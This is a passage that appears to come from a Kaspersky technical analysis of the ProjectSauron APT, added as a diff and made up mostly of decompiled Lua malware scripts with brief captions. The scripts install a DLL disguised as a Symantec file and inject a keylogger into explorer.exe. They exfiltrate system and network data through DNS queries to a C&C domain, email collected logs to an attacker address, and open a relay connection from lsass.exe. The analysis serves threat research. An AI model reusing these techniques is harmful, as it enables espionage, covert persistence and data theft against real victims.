@@ -1,0 +1,259 @@
+Examples of LUA scripts embedded in the Core platform
+The LUA scripts presented were produced by the LuaDec decompiler modified to support the modifications
+of the LUA interpreter that is used in the platform.
+Minimal configuration, just launches the “wdogi” plugin to receive the actual payload from the nearest
+infected server:
+w.exec2str("wdogi -p 47329 192.168.0.1 445")
+Another small script, installs ProjectSauron DLL called symnet32 (mimic Symantec filename) if “McAfee
+Shield” process isn’t found, and then sets its file creation time equal to notepad.exe file:
+pview = w.exec2str("pview")
+if string.find(pview, "mcshield.exe") == nil then
+w.exec2str("winst install symnet32.dll")
+w.exec2str("ftime -c %WINDIR% \ notepad.exe %windir% \ system32 \ symnet32.dll")
+end
+Another small script, removes traces from the location where it supposedly was dropped, then waits for an
+incoming connection with a bigger payload or connect directly to the peer by the IP address that is contained
+in the nearby files:
+get_path = function ()
+local t = w.exec2str("regedit -a \" HKEY_LOCAL_MACHINE \ Software \ VirtualEncryptedNetwork \ Components \" |grep 
+i [snip] ")
+local p = string.match(t, "= \" ([^ \" ]+) \" ")
+if p then
+p = p .. " \ "
+else
+For any inquiries, contact intelreports@kaspersky.com Page 23 of 33
+The ProjectSauron APT. Technical analysis
+p = ""
+end
+return p
+end
+cleanup = function (l_2_0)
+w.exec2str("move \" " .. l_2_0 .. "FakeVirtualEncryptedNetwork.dll \" \" " .. l_2_0 .. "0004.bak \" ")
+w.exec2str("move \" " .. l_2_0 .. "FakeVirtualEncryptedNetwork.exe \" \" " .. l_2_0 .. "0005.bak \" ")
+w.exec2str("rbswap \" " .. l_2_0 .. "0004.bak \" ")
+w.exec2str("rbswap \" " .. l_2_0 .. "0005.bak \" ")
+w.exec2str("del \" " .. l_2_0 .. "0004.bak \" ")
+w.exec2str("del \" " .. l_2_0 .. "0005.bak \" ")
+w.exec2str("del \" " .. l_2_0 .. "FakeVirtualEncryptedNetwork.cfg \" ")
+end
+exec = function (l_3_0)
+local c, l = nil, nil
+local d = w.exec2str("basex -b 16 < \" " .. l_3_0 .. "FakeVirtualEncryptedNetwork.cfg \" ")
+w.exec2str("del \" " .. l_3_0 .. "FakeVirtualEncryptedNetwork.cfg \" ")
+if string.len(d) >= 12 then
+local t = string.sub(d, 1, 8)
+local r = w.exec2str("cat \" " .. l_3_0 .. "settings.cfg \" | grep -i " .. t)
+local t = string.gsub(string.sub(r, 11, -1), "%c", "")
+local t = tonumber(string.sub(d, 9, 12), 16)
+c = "wdogi -f " .. t .. " " .. t
+w.exec2str(c)
+w.exec2str(c)
+end
+if string.len(d) >= 16 then
+local l = tonumber(string.sub(d, 13, 16), 16)
+w.exec2str("wdogi -t 1200 -l -p " .. l)
+else
+w.exec2str("wdogi -t 1200 -l -p 5010")
+end
+end
+local p = get_path()
+cleanup(p)
+exec(p)
+Next, one script generates a new filename for collected keystrokes and injects keylogger module into the
+explorer.exe process:
+For any inquiries, contact intelreports@kaspersky.com Page 24 of 33
+The ProjectSauron APT. Technical analysis
+create_log = function (l_1_0, l_1_1, l_1_2, l_1_3)
+local f = ""
+repeat
+w.sleep(1000)
+t1 = "b"
+t2 = "k"
+t3 = "a"
+t4 = w.randstr("1", 5)
+f = l_1_0 .. t1 .. t2 .. t3 .. t4 .. ".da"
+res = w.start_log("file", f, "new", true, l_1_1, l_1_2, l_1_3)
+until res
+return f
+end
+log_rotate = function (l_2_0, l_2_1)
+res = w.start_log("null")
+new_filename = l_2_0 .. l_2_1
+cmd = string.format("move \" %s \" \" %s \" ", l_2_0, new_filename)
+w.exec(cmd)
+end
+main = function ()
+w.printf("Entering main \n ")
+w.set("flush-time", "10s")
+w.set("inj", true)
+w.set("name", "kblog - waiting for file and injection")
+alist = w.exec2str("dir /a-d /b /F " .. tmp_dir .. "bka*.da")
+if string.find(alist, "bka") then
+sep = " \r\n "
+for s in string.gmatch(alist, "([^" .. sep .. "]+)") do
+w.exec2str("move " .. s .. " " .. s .. "t")
+end
+end
+repeat
+w.printf("Sleep before pview \n ")
+w.sleep(5000)
+proc = w.exec2str("pview")
+until string.find(string.lower(proc), "explorer") ~= nil
+filename = create_log(tmp_dir, SAURON_KBLOG_KEY, 0, 0)
+w.set("name", "kblog running - file " .. filename)
+w.exec("inject explorer.exe kblog -v -t " .. KBLOG_ROTATE_SECS)
+w.stop_log()
+w.sleep(2000)
+log_rotate(filename, "t")
+w.exec(cmd)
+w.stop_log()
+end
+end
+main()
+For any inquiries, contact intelreports@kaspersky.com Page 25 of 33
+The ProjectSauron APT. Technical analysis
+This is a mid-sized script that collects basic system information and sends it in an e-mail. There is a unique
+feature that can also be found in other scripts packaged with the platform: during execution it performs DNS
+requests to seemingly random subdomain names of the “log” C&C domain (“bikessport.com”), and each
+subdomain request is effectively a realtime status update that can be logged and analzyzed by the attackers.
+The script was modified to remove sensitive information.
+externalmail = "74.125.148.11"
+relayPort = "443"
+relayServer = "217.160.176.157"
+mailto = "xxx.xxx.xxx@gmail.com"
+mailSubject = "Regarding your offer"
+mailBody = "This is to inform you that I decline your offer. See attachment. \n Best Regards xxxxx"
+domain = "bikessport.com"
+smtpport = ""
+smtpserver = ""
+mail = function (l_1_0, l_1_1, l_1_2, l_1_3, l_1_4)
+buffer = ""
+id1 = string.upper(string.format("%04x%04x", math.random(4369, 65535), math.random(0, 65535)))
+id2 = string.format("%07u", math.random(0, 9999999))
+boundary = string.format("--------------%06u%06u%06u%06u", math.random(0, 9999), math.random(0, 9999),
+math.random(0, 9999), math.random(0, 9999))
+delimiter = " \r\n "
+endOfRow = " \r\n "
+startBoundary = string.format("--%s", boundary)
+endBoundary = string.format("%s%s--%s", endOfRow, startBoundary, endOfRow)
+buffer = string.format("%sMessage-ID: %s.%s@localhost.localdomain%s", buffer, id1, id2, endOfRow)
+buffer = string.format("%sFrom: <%s>%s", buffer, l_1_1, endOfRow)
+buffer = string.format("%sUser-Agent: Thunderbird 2.0.0.9 (Windows/20071031)%s", buffer, endOfRow)
+buffer = string.format("%sMIME-Version: 1.0%s", buffer, endOfRow)
+buffer = string.format("%sTo: %s%s", buffer, l_1_0, endOfRow)
+buffer = string.format("%sSubject: %s%s", buffer, l_1_2, endOfRow)
+buffer = string.format("%sContent-Type: multipart/mixed;%s boundary= \" %s \" %s", buffer, endOfRow, boundary,
+endOfRow)
+buffer = string.format("%s%s", buffer, endOfRow)
+buffer = string.format("%sThis is a multi-part message in MIME format.%s%s%s", buffer, endOfRow, startBoundary,
+endOfRow)
+buffer = string.format("%sContent-Type: text/plain; charset=ISO-8859-1; format=flowed%s", buffer, endOfRow)
+buffer = string.format("%sContent-Transfer-Encoding: 7bit%s%s", buffer, endOfRow, endOfRow)
+buffer = string.format("%s%s%s", buffer, l_1_3, endOfRow)
+buffer = string.format("%s%s%s%s", buffer, endOfRow, startBoundary, endOfRow)
+buffer = string.format("%sContent-Type: application/x-msdownload; \r\n name= \" data.bin \" %s", buffer, endOfRow)
+buffer = string.format("%sContent-Transfer-Encoding: base64%s", buffer, endOfRow)
+buffer = string.format("%sContent-Disposition: attachment; \r\n filename= \" data.bin \" %s%s", buffer, endOfRow,
+endOfRow)
+strLen = string.len(l_1_4)
+index = 1
+repeat
+if index < strLen then
+istart = index
+index = index + 72
+iend = index - 1
+For any inquiries, contact intelreports@kaspersky.com Page 26 of 33
+The ProjectSauron APT. Technical analysis
+if strLen < iend then
+iend = strLen
+end
+buffer = string.format("%s%s%s", buffer, string.sub(l_1_4, istart, iend), endOfRow)
+else
+buffer = string.format("%s%s", buffer, endBoundary)
+return buffer
+end
+end
+end
+systemcheck = function ()
+w.exec("sinfo")
+execStr = string.format("sinfo | basex -b 32url | dext -l 30 a." .. domain .. " | nslu -")
+res = w.exec2str(execStr)
+w.exec("netnfo -A")
+execStr = string.format("netnfo -irc | basex -b 32url | dext -l 30 c." .. domain .. " | nslu -")
+res = w.exec2str(execStr)
+w.exec2str("su -t explorer.exe")
+w.exec("regedit -a \"\ HKCU \ Software \ Microsoft \ Windows \ CurrentVersion \ Internet Settings \" ")
+execStr = string.format("regedit -a \"\ HKCU \ Software \ Microsoft \ Windows \ CurrentVersion \ Internet Settings \" |
+basex -b 32url | dext -l 30 d." .. domain .. " | nslu -")
+res = w.exec2str(execStr)
+w.drop_token()
+return res
+end
+math.randomseed(os.time())
+res = w.start_log("mem", nil, nil)
+if res then
+s = w.exec2str("injchk")
+if string.find(s, "Not detected.") then
+w.set("inj", true)
+sux = w.exec2str("sux")
+if string.find(sux, "Success") then
+w.exec("detach start blob lsass.exe")
+execStr = string.format("nslu agc5221." .. domain)
+w.exec2str(execStr)
+else
+w.exec("sudetach start blob")
+execStr = string.format("nslu agc9221." .. domain)
+w.exec2str(execStr)
+end
+else
+execStr = string.format("nslu agc3221." .. domain)
+w.exec2str(execStr)
+end
+end
+execStr = string.format("wipe FakeVirtualEncryptedNetwork.cfg")
+w.exec(execStr)
+execStr = string.format("rbswap FakeVirtualEncryptedNetwork.EXE")
+w.exec(execStr)
+For any inquiries, contact intelreports@kaspersky.com Page 27 of 33
+The ProjectSauron APT. Technical analysis
+sres = systemcheck()
+w.exec("plist")
+w.exec("wfw status")
+w.exec("dinst")
+regStr = w.exec2str("cat VirtualEncryptedNetwork.ini|grep -i \" pop|smtp")
+for k,v in string.gmatch(regStr, "(%w+)=([%w,%. ])") do*
+if string.lower(k) == "smtpserver" then
+smtpserver = v
+end
+if string.lower(k) == "smtpport" then
+smtpport = v
+end
+end
+w.printf("Server %s port %s \n ", smtpserver, smtpport)
+w.debugf("Server %s port %s \n ", smtpserver, smtpport)
+end
+dllNameUninst = "mfc64d.dll"
+windir = os.getenv("WINDIR")
+w.exec(string.format("put2 uninstdll \" %s \ SYSTEM32 \ %s \" ", windir, dllNameUninst))
+w.exec("winst install " .. dllNameUninst)
+w.exec(string.format("ftime -c \" %s \ SYSTEM32 \ ntdll.dll \" \" %s \ SYSTEM32 \ %s \" ", windir, windir, dllNameUninst))
+w.exec("winst launch " .. dllNameUninst)
+execStr = string.format("nslu ahc3221." .. domain)
+w.exec2str(execStr)
+w.exec("w3get -s http://whatismyipaddress.com/")
+execStr = string.format("nslu ahc3421." .. domain)
+w.exec2str(execStr)
+w.exec("wdogi -f -j -I lsass.exe " .. relayServer .. " " .. relayPort)
+execStr = string.format("nslu ahc3422." .. domain)
+w.exec2str(execStr)
+w.exec("dir /s /b ap.txt link.txt node*.tun VirtualEncryptedNetwork.licence VirtualEncryptedNetworkEMail.key
+VirtualEncryptedNetwork.ini [snip] ")
+w.exec("dir /s /b ap.txt link.txt node*.tun VirtualEncryptedNetwork.licence VirtualEncryptedNetworkEMail.key
+VirtualEncryptedNetwork.ini [snip] | get2 -")
+w.stop_log()
+log = w.get_mem_log()
+slask = mail(mailto, mailto, mailSubject, mailBody, log)
+slask2 = w.exec2str("smtpsend " .. externalmail .. " " .. mailto .. " " .. mailto, slask)
+w.debugf(slask2)
+slask2 = w.exec2str("smtpsend " .. smtpserver .. " " .. mailto .. " " .. mailto, slask)
+w.debugf(slask2)
